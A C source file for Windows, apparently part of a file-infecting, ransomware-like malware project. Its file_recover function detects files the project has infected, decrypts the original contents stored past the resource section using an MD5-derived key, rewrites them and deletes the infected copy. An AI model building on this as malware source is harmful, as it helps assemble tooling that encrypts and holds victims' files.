
#include <malloc.h>
#include <memory.h>
#include <string.h>

#include <windows.h>

#include "encoder_unlocker.h"
#include "file_infect.h"
#include "file_recover.h"

void file_recover(char* file_path,char decrypt_md5[16]) {
    if (!file_is_infect(file_path)) return;

    char path[512]={0};
    char* path_expand_name_offest=strstr(file_path,".exe");
    unsigned int path_length=(NULL!=path_expand_name_offest)?path_expand_name_offest-file_path:0;

    if (path_length) {
        memcpy(path,file_path,path_length);

        HANDLE old_file=CreateFile(file_path,GENERIC_READ,NULL,NULL,OPEN_EXISTING,NULL,NULL);
        HANDLE new_file=CreateFile(path,GENERIC_WRITE,NULL,NULL,OPEN_ALWAYS,NULL,NULL);

        if (INVALID_HANDLE_VALUE!=old_file &&
            INVALID_HANDLE_VALUE!=new_file) {
            unsigned long old_file_length=GetFileSize(old_file,NULL);
            char* old_file_buffer=(char*)malloc(old_file_length);

            if (NULL!=old_file_buffer) {
                unsigned long read_length=0;
                SetFilePointer(old_file,file_get_end_rsrc(),NULL,FILE_BEGIN);
                old_file_length-=file_get_end_rsrc();
                ReadFile(old_file,old_file_buffer,old_file_length,&read_length,NULL);
                unsigned long output_length=0;
                char* output=encoder_unlocker((unsigned char*)old_file_buffer,old_file_length,(unsigned char*)decrypt_md5,&output_length);
                WriteFile(new_file,(LPCVOID)output,output_length,&read_length,NULL);
                free(output);
                free(old_file_buffer);
            }
            CloseHandle(old_file);
            CloseHandle(new_file);
            DeleteFile(file_path);
        }
    }
}
